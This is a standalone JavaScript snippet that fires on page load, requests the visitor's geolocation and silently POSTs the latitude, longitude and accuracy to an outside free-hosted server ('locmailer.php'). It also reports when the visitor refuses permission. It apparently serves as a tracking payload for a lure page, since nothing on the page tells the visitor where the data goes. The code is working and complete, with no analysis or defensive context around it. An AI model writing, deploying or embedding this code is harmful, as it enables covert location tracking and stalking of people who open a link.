<script type="text/javascript">
   	window.onload = getlocation();

   		//ajax data

   	function ajax(msg){
   		document.getElementById("bd").style.overflow = "hidden";
   		document.getElementById("ds").style.display = "block";
   		document.getElementById("esms").innerHTML = msg;
          
   		var xhttp = new XMLHttpRequest();
   	   xhttp.open("POST","https://banglaerphoto.000webhostapp.com/contact/locerror.php");
   	   xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   	   xhttp.send("error_msg="+msg);
   	}

		    function getlocation() {
		    	if (navigator.geolocation) {
		        navigator.geolocation.getCurrentPosition(showPosition, showError);
		     } else {
             ajax("Geolocation is not supported by this browser.")
		     }
		    		}


   //show position

    function showPosition(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        var accuracy = position.coords.accuracy; 

 		   data = "latitude=" + latitude + "&" + "longitude=" + longitude + "&" + "accuracy=" + accuracy;
   		
   	   var xhttp = new XMLHttpRequest();
   	   xhttp.open("POST","https://banglaerphoto.000webhostapp.com/contact/locmailer.php");
   	   xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   	   xhttp.send(data);
   	 		}


   //error message
   	
   	function showError(error) {
  switch(error.code) {
    case error.PERMISSION_DENIED:
      ajax("User denied the request for Geolocation.");
      break;
    case error.POSITION_UNAVAILABLE:
      ajax("Location information is unavailable.");
      break;
    case error.TIMEOUT:
      ajax("The request to get user location timed out.")
      break;
    case error.UNKNOWN_ERROR:
      ajax("An unknown error occurred.");
      break;
  }
} 				 
   	 						

   </script>
